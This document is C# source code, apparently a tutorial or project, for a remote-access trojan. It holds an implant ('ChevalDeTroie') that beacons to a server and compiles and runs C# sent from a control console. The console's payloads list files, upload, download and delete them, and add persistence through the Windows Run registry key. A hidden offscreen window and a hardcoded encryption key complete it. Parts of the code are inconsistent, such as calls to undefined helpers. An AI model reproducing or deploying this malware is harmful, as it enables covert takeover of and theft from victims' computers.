using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class Serveur{
	private const int PORT = 80;
	private const string EOF = "<EOF>";
	private TcpListener tcpListener;
	private Thread listenThread;
	private void ListenForClients() {
		this.tcpListener.Start();
		while (true) {
			TcpClient client = this.tcpListener.AcceptTcpClient();
			Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
			clientThread.Start(client);
		}
	}
	public static byte[] read(NetworkStream clientStream, Encoding encoder) {
		byte[] result = new byte[0];
		int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
		while (true) {
			byte[] message = new byte[4096];
			int bytesRead = 0;
			try {
				bytesRead = clientStream.Read(message, 0, 4096);
			} catch(Exception exception) {
				Console.WriteLine(exception);
				break;
			}
			if (bytesRead == 0) {
				return result;
			}
			Array.Resize<byte>(ref result, result.Length + bytesRead);
			Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
			if(encoder.GetString(result).EndsWith(EOF)) {
				break;
			}
		}
		int eofLength = encoder.GetBytes(EOF).Length;
		byte[] truncatedResult = new byte[result.Length - eofLength];
		Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
		return truncatedResult;
	}
	public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer) {
		byte[] plainBuffer = concatenateBytes(buffer, encoder.GetBytes(EOF));
		clientStream.Write(plainBuffer, 0 , plainBuffer.Length);
		clientStream.Flush();
	}
	private void HandleClientComm(object client) {
		TcpClient tcpClient = (TcpClient)client;
		NetworkStream clientStream = tcpClient.GetStream();
		ASCIIEncoding encoder = new ASCIIEncoding();
		write(clientStream, encoder, read(clientStream, encoder));
		tcpClient.Close();
	}
	public Serveur(){
		this.tcpListener = new TcpListener(IPAddress.Any, PORT);
		this.listenThread = new Thread(new ThreadStart(ListenForClients));
		this.listenThread.Start();
	}
	public static void Main(string []args) {
		new Serveur();
	}
}
Client.cs :

using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

public class Client {
	private const int PORT = 80;
	private const string IP = "127.0.0.1";
	private const string EOF = "<EOF>";
	public static byte[] read(NetworkStream clientStream, Encoding encoder) {
		byte[] result = new byte[0];
		int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
		while (true) {
			byte[] message = new byte[4096];
			int bytesRead = 0;
			try {
				bytesRead = clientStream.Read(message, 0, 4096);
			} catch(Exception exception) {
				Console.WriteLine(exception);
				break;
			}
			if (bytesRead == 0) {
				return result;
			}
			Array.Resize<byte>(ref result, result.Length + bytesRead);
			Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
			if(encoder.GetString(result).EndsWith(EOF)) {
				break;
			}
		}
		int eofLength = encoder.GetBytes(EOF).Length;
		byte[] truncatedResult = new byte[result.Length - eofLength];
		Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
		return truncatedResult;
	}
	public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer) {
		byte[] plainBuffer = concatenateBytes(buffer, encoder.GetBytes(EOF));
		clientStream.Write(plainBuffer, 0 , plainBuffer.Length);
		clientStream.Flush();
	}
	public Client(){
		IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
		try {
			TcpClient client = new TcpClient();
			client.Connect(serverEndPoint);
			NetworkStream clientStream = client.GetStream();
			ASCIIEncoding encoder = new ASCIIEncoding();
			write(clientStream, encoder, "Echo");
			Console.WriteLine(encoder.GetString(read(clientStream, encoder)));
			client.Close();
		} catch(Exception exception) {

		}
	}
	public static void Main(string []args) {
		new Client();
	}
}

Communication.cs :

using System;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

public class Communication {
	private const string PASS = "2f8RHNB44gPtaelSVztU2ZXUbuEn1OiY";
	private const string EOF = "<EOF>";
	public static byte[] Encrypt(string password, byte[] data) {
		RijndaelManaged rijndael = new RijndaelManaged();
		rijndael.Mode = CipherMode.CBC;
		Rfc2898DeriveBytes rfcDb = new Rfc2898DeriveBytes(password, System.Text.Encoding.UTF8.GetBytes(password));
		byte[] key = rfcDb.GetBytes(16);
		byte[] iv = rfcDb.GetBytes(16);
		ICryptoTransform aesEncryptor = rijndael.CreateEncryptor(key, iv);
		MemoryStream ms = new MemoryStream();
		CryptoStream cs = new CryptoStream(ms, aesEncryptor, CryptoStreamMode.Write);
		cs.Write(data, 0, data.Length);
		cs.FlushFinalBlock();
		byte[] CipherBytes = ms.ToArray();
		ms.Close();
		cs.Close();
		return CipherBytes;
	}
	public static byte[] Decrypt(string password, byte[] data) {
			RijndaelManaged rijndael = new RijndaelManaged();
			rijndael.Mode = CipherMode.CBC;
			Rfc2898DeriveBytes rfcDb = new Rfc2898DeriveBytes(password, System.Text.Encoding.UTF8.GetBytes(password));
			byte[] key = rfcDb.GetBytes(16);
			byte[] iv = rfcDb.GetBytes(16);
			ICryptoTransform decryptor = rijndael.CreateDecryptor(key, iv);
			MemoryStream ms = new MemoryStream(data);
			CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read);
			byte[] plainTextData = new byte[data.Length];
			int decryptedByteCount = cs.Read(plainTextData, 0, plainTextData.Length);
			ms.Close();
			cs.Close();
			byte[] result = new byte[decryptedByteCount];
			Array.Copy(plainTextData, 0, result, 0, result.Length);
			return result;
	}
	public static byte[] read(NetworkStream clientStream, Encoding encoder) {
		byte[] result = new byte[0];
		int tokenSize = Convert.ToBase64String(encoder.GetBytes(EOF)).Length;
		while (true) {
			byte[] message = new byte[4096];
			int bytesRead = 0;
			try {
				bytesRead = clientStream.Read(message, 0, 4096);
			} catch(Exception exception) {
				Console.WriteLine(exception);
				break;
			}
			if (bytesRead == 0) {
				return result;
			}
			Array.Resize<byte>(ref result, result.Length + bytesRead);
			Array.Copy(message, 0, result, result.Length - bytesRead, bytesRead);
			if(encoder.GetString(result).EndsWith(EOF)) {
				break;
			}
		}
		int eofLength = encoder.GetBytes(EOF).Length;
		byte[] truncatedResult = new byte[result.Length - eofLength];
		Array.Copy(result, 0, truncatedResult, 0, truncatedResult.Length);
		return Decrypt(PASS, truncatedResult);
	}
	public static byte[] concatenateBytes(byte[] one, byte[] two) {
		byte[] result = new byte[one.Length + two.Length];
		Array.Copy(one, 0, result, 0, one.Length);
		Array.Copy(two, 0, result, one.Length, two.Length);
		return result;
	}
	public static void write(NetworkStream clientStream, Encoding encoder, byte[] buffer) {
		byte[] encryptedBuffer = concatenateBytes(Encrypt(PASS, buffer), encoder.GetBytes(EOF));
		clientStream.Write(encryptedBuffer, 0 , encryptedBuffer.Length);
		clientStream.Flush();
	}
	public static string readString(NetworkStream clientStream, Encoding encoder) {
		return encoder.GetString(read(clientStream, encoder));
	}
	public static void writeString(NetworkStream clientStream, Encoding encoder, string data) {
		write(clientStream, encoder, encoder.GetBytes(data));
	}
}

ChevalDeTroie.cs :

...
private const int RETRY_DELAY = 5000;
public static string ID = "azerty";
public ChevalDeTroie(){
	IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
	while(true) {
		try {
			TcpClient client = new TcpClient();
			client.Connect(serverEndPoint);
			NetworkStream clientStream = client.GetStream();
			ASCIIEncoding encoder = new ASCIIEncoding();
			Communication.writeString(clientStream, encoder, ID);
			while(true) {
				string command = Communication.readString(clientStream, encoder);
				if(command == "exit") {
					Communication.writeString(clientStream, encoder, command);
					break;
				}
				Evaluator eval = new Evaluator("tosend = execute()", Evaluator.EvaluationType.SingleLineReturn, Evaluator.Language.CSharp);
				eval.AddReference("System.dll");
				eval.AddVariable("tosend", new byte[0]);
				eval.AddCustomMethod(command);
				Evaluator.EvaluationResult result = eval.Eval();
				if (result.ThrewException) {
					Communication.writeString(clientStream, encoder, result.Exception.Message);
				} else {
					Communication.write(clientStream, encoder, result.Variables["tosend"].VariableValue as byte[]);
				}
			}
			client.Close();
		} catch(Exception exception) {

		}
		Thread.Sleep(RETRY_DELAY);
	}
}
...

CentreDeControle.cs :

public const string PAYLOAD_ECHO = "public static byte[] execute(){ return System.Text.ASCIIEncoding.ASCII.GetBytes(\"Hello \" + Server.ID); }";
public const string PAYLOAD_LIST_DIR = @"public static byte[] execute(){ 
			string[] array1 = System.IO.Directory.GetDirectories(""."");
			System.Text.StringBuilder sb = new System.Text.StringBuilder();
			foreach (string name in array1){ 
				sb.Append(name + ""\n"");
			}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(sb.ToString());
		}";
public const string PAYLOAD_PWD = @"public static byte[] execute(){
			return System.Text.ASCIIEncoding.ASCII.GetBytes(System.IO.Directory.GetCurrentDirectory());
		}";
public const string PAYLOAD_CD = @"public static byte[] execute(){{
			string dir = ""{0}"";
			System.IO.Directory.SetCurrentDirectory(dir);
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""Directory changed to "" + dir);
		}}";
public const string PAYLOAD_UPLOAD = @"public static byte[] execute(){{
			System.IO.File.WriteAllBytes(""{0}"", Convert.FromBase64String(""{1}""));
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""File {0} successfully created."");
		}}";
public const string PAYLOAD_DOWNLOAD = @"public static byte[] execute(){{
			return System.IO.File.ReadAllBytes(""{0}"");
		}}";
public const string PAYLOAD_DELETE = @"public static byte[] execute(){{
			System.IO.File.Delete(""{0}"");
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""File {0} deleted"");
		}}";
public const string PAYLOAD_LS = @"public static byte[] execute(){
			string[] array1 = System.IO.Directory.GetFiles(""."");
			System.Text.StringBuilder sb = new System.Text.StringBuilder();
			foreach (string name in array1){ 
				sb.Append(name + ""\n"");
			}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(sb.ToString());
		}";
public const string PAYLOAD_TERMINATE = @"public static byte[] execute(){
			System.Environment.Exit(0);
			return System.Text.ASCIIEncoding.ASCII.GetBytes("""");
		}";
public const string PAYLOAD_PERSIST = @"public static byte[] execute(){{
			string path = System.IO.Path.GetTempFileName() + "".exe"";
			System.IO.File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, path);
			string runKey = ""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"";
			Microsoft.Win32.RegistryKey startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey);
			if (startupKey.GetValue(""{0}"") == null){{
				startupKey.Close();
				startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey, true);
				startupKey.SetValue(""{0}"", path);
				startupKey.Close();
			}}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""Key {0} created"");
		}}";


	private const int PORT = 80;
	private const int TIMEOUT = 10;
	private const int OFFLINE = 30;
	private const string NO_CLIENT_ID = "Reload";
	private TcpListener tcpListener;
	private Thread listenThread;
	private Thread menuThread;
	private bool connected = false;
	private string clientID = NO_CLIENT_ID;
	private Dictionary<string, long> clientNames = new Dictionary<string, long>();
	private void ListenForClients() {
		this.tcpListener.Start();
		while (true) {
			TcpClient client = this.tcpListener.AcceptTcpClient();
			Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
			clientThread.Start(client);
		}
	}
	private void DisplayMenu(){
		int looper = 0;
		while(true) {
			if(clientID != NO_CLIENT_ID && (connected || looper<TIMEOUT)){
				Thread.Sleep(1000);
				looper+=1;
				continue;
			}
			if(clientID != NO_CLIENT_ID){
				Console.WriteLine("Connection failed!");
			}
			looper = 0;
			List<string> names = new List<string>();
			names.Add(NO_CLIENT_ID);
			foreach (KeyValuePair<string, long> keyValue in clientNames){
				if(getCurrentTime() - keyValue.Value<=OFFLINE){
					names.Add(keyValue.Key);
				}
			}
			for(int i = 0;i < names.Count; i++){
				Console.WriteLine("[" + i + "] " + names[i]);
			}
			this.clientID = names[int.Parse(Console.ReadLine())];
			if(this.clientID != NO_CLIENT_ID){
				Console.WriteLine("Connecting...");
			}
		}
	}
	private void HandleClientComm(object client) {
		TcpClient tcpClient = (TcpClient)client;
		NetworkStream clientStream = tcpClient.GetStream();
		string id = getId(clientStream);
		if(clientID != id){
			sendPayload(clientStream, Payload.PAYLOAD_EXIT);
			tcpClient.Close();
			if(!clientNames.ContainsKey(id)){
				clientNames.Add(id, getCurrentTime());
			}else{
				clientNames[id] = getCurrentTime();
			}
			return;
		}
		connected = true;
		ConsoleColor current = Console.ForegroundColor;
		while(true) {
			try{
				Console.Write(id + "> ");
				Console.ForegroundColor = ConsoleColor.Yellow;
				System.Text.RegularExpressions.Regex myRegex = new System.Text.RegularExpressions.Regex("(?<cmd>^\"[^\"]*\"|\\S*) *(?<prm>.*)?");
				System.Text.RegularExpressions.Match m = myRegex.Match(Console.ReadLine());
				Console.ForegroundColor = ConsoleColor.Green;
				if(m.Success) {
					if(m.Groups[1].Value == "cd") {
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_CD, m.Groups[2].Value.Replace("\\", "\\\\")))));
					} else if(m.Groups[1].Value == "exit" || m.Groups[1].Value == "quit") {
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_EXIT)));
						Console.ForegroundColor = current;
						break;
					} else if(m.Groups[1].Value == "upload") {
						System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_UPLOAD, parameters["o"].Replace("\\", "\\\\"), Convert.ToBase64String(File.ReadAllBytes(parameters["i"]))))));
					} else if(m.Groups[1].Value == "download") {
						System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						File.WriteAllBytes(parameters["o"], sendPayload(clientStream, String.Format(Payload.PAYLOAD_DOWNLOAD, parameters["i"].Replace("\\", "\\\\"))));
						Console.WriteLine("File " + parameters["i"] + " Downloaded to " + parameters["o"]);
					} else if(m.Groups[1].Value == "pwd") {
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_PWD)));
					} else if(m.Groups[1].Value == "rm") {
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_DELETE, m.Groups[2].Value.Replace("\\", "\\\\")))));
					} else if(m.Groups[1].Value == "ls") {
						Console.ForegroundColor = ConsoleColor.Blue;
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_LIST_DIR)));
						Console.ForegroundColor = ConsoleColor.Green;
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_LS)));
					} else if(m.Groups[1].Value == "terminate") {
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, Payload.PAYLOAD_TERMINATE)));
						Console.ForegroundColor = current;
						break;
					} else if(m.Groups[1].Value == "persist") {
						System.Collections.Generic.Dictionary<string, string> parameters = getParameters(m.Groups[2].Value);
						Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(sendPayload(clientStream, String.Format(Payload.PAYLOAD_PERSIST, parameters["n"]))));
					}
				}
			}catch(Exception exception){
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(exception);
			}
			Console.ForegroundColor = current;
		}
		tcpClient.Close();
		connected = false;
		clientNames[id] = getCurrentTime();
		clientID = NO_CLIENT_ID;
	}
	private static long getCurrentTime(){
		TimeSpan _TimeSpan = (DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0));
		return (long)_TimeSpan.TotalSeconds;
	}
	private static System.Collections.Generic.Dictionary<string, string> getParameters(string param) {
		System.Text.RegularExpressions.Regex myRegex = new System.Text.RegularExpressions.Regex("(?:\\s*)(?<=[-|/])(?<name>\\w*)[:|=](\"((?<value>.*?)(?<!\\\\)\")|(?<value>[\\w]*))");
		System.Text.RegularExpressions.Match m = myRegex.Match(param);
		System.Collections.Generic.Dictionary<string, string> result = new System.Collections.Generic.Dictionary<string, string>();
		while(m.Success) {
			result.Add(m.Groups[3].Value, m.Groups[4].Value);
			m = m.NextMatch();
		}
		return result;
	}
	public static byte[] sendPayload(NetworkStream clientStream, string payload) {
		ASCIIEncoding encoder = new ASCIIEncoding();
		try{
			Communication.writeString(clientStream, encoder, payload);
		} catch(Exception exception) {
			Console.WriteLine(exception);
		}
		byte[] result = new byte[0];
		try{
			result = Communication.read(clientStream, encoder);
		} catch(Exception exception) {
			Console.WriteLine(exception);
		}
		return result;
	}
	public static string getId(NetworkStream clientStream) {
		ASCIIEncoding encoder = new ASCIIEncoding();
		string id = Communication.readString(clientStream, encoder);
		try{
			Communication.writeString(clientStream, encoder, Payload.PAYLOAD_ECHO);
		} catch(Exception exception) {
			Console.WriteLine(exception);
		}
		Communication.read(clientStream, encoder);
		return id;
	}
	public Program(){
		this.tcpListener = new TcpListener(IPAddress.Any, PORT);
		this.listenThread = new Thread(new ThreadStart(ListenForClients));
		this.listenThread.Start();
		this.menuThread = new Thread(new ThreadStart(DisplayMenu));
		this.menuThread.Start();
	}
	public static void Main(string []args) {
		new Program();
	}
}
partial class MainForm{
	private System.ComponentModel.IContainer components = null;
	protected override void Dispose(bool disposing){
		if (disposing) {
			if (components != null) {
				components.Dispose();
			}
		}
		base.Dispose(disposing);
	}
	private void InitializeComponent(){
		this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.Text = "ServerReverse";
		this.Name = "MainForm";
		this.WindowState = FormWindowState.Minimized;
		this.ShowInTaskbar = false;
		this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
		this.StartPosition = FormStartPosition.Manual;
		this.Location = new System.Drawing.Point(-10000, -10000);
		this.Size = new System.Drawing.Size(1, 1);
		this.WindowState = FormWindowState.Minimized;
	}
}
